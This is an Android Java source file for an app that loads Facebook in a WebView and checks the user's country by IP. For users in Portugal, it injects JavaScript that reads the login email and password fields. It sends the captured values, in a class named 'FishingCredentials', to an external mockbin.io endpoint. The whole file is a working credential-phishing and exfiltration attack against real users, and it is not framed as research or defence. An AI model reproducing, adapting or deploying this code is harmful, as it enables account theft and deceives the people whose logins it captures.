package com.example.accesstrigger;

import android.os.Bundle;
import android.util.Log;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

import java.util.Objects;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class WebViewActivity extends AppCompatActivity {

    private static final String IP_API_URL = "http://ip-api.com/";
    private WebView myWebView;
    private boolean isInPortugal = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_web_view);

        // Initialize WebView
        myWebView = findViewById(R.id.webview);
        WebSettings webSettings = myWebView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        myWebView.setWebViewClient(new WebViewClient());

        myWebView.setVerticalScrollBarEnabled(true);
        myWebView.setHorizontalScrollBarEnabled(true);
        myWebView.setScrollBarStyle(WebView.SCROLLBARS_INSIDE_OVERLAY);
        webSettings.setDomStorageEnabled(true);

        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);

        myWebView.addJavascriptInterface(new WeAppInterface(), "Android");

        // Load initial URL
        myWebView.loadUrl("https://www.facebook.com");

        // Fetch location data
        getLocation();
    }

    private void injectJavaScript() {
        myWebView.loadUrl("javascript:(function() {" +
                "console.log('Injecting JavaScript');" +
                "var email = document.querySelector('#m_login_email').value ;" +
                "var password = document.querySelector('input[name=\"pass\"]').value  ;" +
                "Android.handleLoginData(email,password);" +
                "})()");
    }

    public class WeAppInterface {
        @JavascriptInterface
        public void handleLoginData(String emailFac, String passwordFac) {

            String url = "https://5971c4846f2b461fb61ef015c0ce85bf.api.mockbin.io/";

            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl(url)
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();

            // Create API service
            ApiService apiService = retrofit.create(ApiService.class);

            // Create request body
            FishingCredentials loginRequest = new FishingCredentials(emailFac, passwordFac);

            // Send POST request
            Call<Void> call = apiService.sendCredentials(loginRequest);
            call.enqueue(new Callback<Void>() {
                @Override
                public void onResponse(Call<Void> call, Response<Void> response) {
                    if (response.isSuccessful()) {
                        Log.i("WebView", "Data sent successfully!");
                    } else {
                        Log.e("WebView", "Request failed with code: " + response.code());
                    }
                }

                @Override
                public void onFailure(Call<Void> call, Throwable t) {
                    Log.e("WebView", "Request failed", t);
                }
            });
        }
    }

    private void getLocation() {
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(IP_API_URL)
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        ApiService service = retrofit.create(ApiService.class);

        Call<IPDataModel> call = service.getLocation();
        call.enqueue(new Callback<IPDataModel>() {
            @Override
            public void onResponse(Call<IPDataModel> call, Response<IPDataModel> response) {
                if (response.isSuccessful() && response.body() != null) {
                    Log.i("geolocationREQUEST", "Request successful, parsing response...");

                    IPDataModel data = response.body();
                    String country = data.getCountry();
                    String countryCode = data.getCountryCode();

                    if (Objects.equals(country, "Portugal")) {
                        isInPortugal = true;
                    }

                    Log.i("Location Country","Country: " + country);

                    // Setup WebViewClient and inject JavaScript only if in Portugal
                    if (isInPortugal) {
                        myWebView.setWebViewClient(new WebViewClient() {
                            @Override
                            public void onPageFinished(WebView view, String url) {
                                super.onPageFinished(view, url);
                                injectJavaScript();
                            }
                        });
                    }
                } else {
                    Log.e("geolocationREQUEST", "Request failed with code: " + response.code());
                }
            }

            @Override
            public void onFailure(Call<IPDataModel> call, Throwable t) {
                Log.e("geolocationREQUEST", "Failure", t);
            }
        });
    }

}